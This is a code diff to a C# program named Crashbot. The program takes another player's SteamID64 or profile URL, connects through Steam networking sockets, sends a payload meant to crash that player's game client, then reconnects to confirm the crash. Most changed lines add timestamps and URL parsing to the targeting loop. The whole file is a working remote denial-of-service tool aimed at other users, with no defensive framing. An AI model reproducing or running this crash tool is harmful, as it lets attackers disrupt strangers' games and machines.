@@ -31,51 +31,68 @@ namespace Crashbot
             if (!Steamworks.SteamAPI.Init())
             {
                 Console.Clear();
-                Console.WriteLine("SteamAPI.Init() failed!");
+                Console.WriteLine($"[{DateTime.Now}] SteamAPI.Init() failed!");
                 return;
             }
             else
             {
                 Console.Clear();
-                Console.WriteLine("UserName: '" + Steamworks.SteamFriends.GetPersonaName()+"'");
-                Console.WriteLine("SteamId: " + Steamworks.SteamUser.GetSteamID().m_SteamID);
-                Console.WriteLine("BLoggedOn: [" + Steamworks.SteamUser.BLoggedOn()+"]");
+                Console.WriteLine($"[{DateTime.Now}] UserName: '" + Steamworks.SteamFriends.GetPersonaName()+"'");
+                Console.WriteLine($"[{DateTime.Now}] SteamId: " + Steamworks.SteamUser.GetSteamID().m_SteamID);
+                Console.WriteLine($"[{DateTime.Now}] BLoggedOn: [" + Steamworks.SteamUser.BLoggedOn()+"]");
             }
 
             while (true)
             {
                 // Gather target
                 Console.WriteLine(Environment.NewLine);
-                Console.Write("Enter target SteamID64: ");
-                ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");
+                Console.Write($"[{DateTime.Now}] Enter target SteamID64: ");
+
+                string steamid = Program.ReadSteamId();
+                if (string.IsNullOrEmpty(steamid))
+                    continue;
+                ulong target = ulong.Parse(steamid);
 
                 // Initiate the connection
-                Console.WriteLine("Connecting...");
+                Console.WriteLine($"[{DateTime.Now}] Connecting...");
                 var (conn, info) = ConnectAndWait(target, LongTimeoutOptions);
 
                 if (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
                 {
-                    Console.WriteLine("Connected!");
+                    Console.WriteLine($"[{DateTime.Now}] Connected!");
                 }
                 else
                 {
-                    Console.WriteLine("Failed to connect. Possibly Friends Only or Private");
+                    Console.WriteLine($"[{DateTime.Now}] Failed to connect. Possibly Friends Only or Private");
                     continue;
                 }
 
                 // Crash the client
                 Program.ReadOneAndSendOne(conn, 0, 0, 0);
-                Console.WriteLine("Crashing client...");
+                Console.WriteLine($"[{DateTime.Now}] Crashing client...");
                 Thread.Sleep(500);
                 Steamworks.SteamNetworkingSockets.CloseConnection(conn, 0, string.Empty, false);
 
                 // Check if the client crashed
-                Console.WriteLine("Checking target...");
+                Console.WriteLine($"[{DateTime.Now}] Checking target...");
                 var (_, info2) = ConnectAndWait(target, ConnectionTimeoutOptions);
 
                 bool crashed = info2.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally;
-                Console.WriteLine(crashed ? "Successfully Crashed!" : "Failed to Crash. Possibly Friends Only or Private");
+                Console.WriteLine($"[{DateTime.Now}] {(crashed ? "Successfully Crashed!" : "Failed to Crash. Possibly Friends Only or Private")}");
             }
+        }
+
+        private static string ReadSteamId()
+        {
+            string steamid = Console.ReadLine()?.Trim() ?? string.Empty;
+            
+            if (string.IsNullOrEmpty(steamid))
+                Console.WriteLine($"[{DateTime.Now}] Invalid SteamID64");
+
+            if (steamid.Contains("http", StringComparison.InvariantCultureIgnoreCase))
+                steamid = steamid.Split('/').Last();
+            
+            return steamid;
         }
 
         private static (HSteamNetConnection Connection, SteamNetConnectionInfo_t Info) ConnectAndWait(ulong target, SteamNetworkingConfigValue_t[] options)
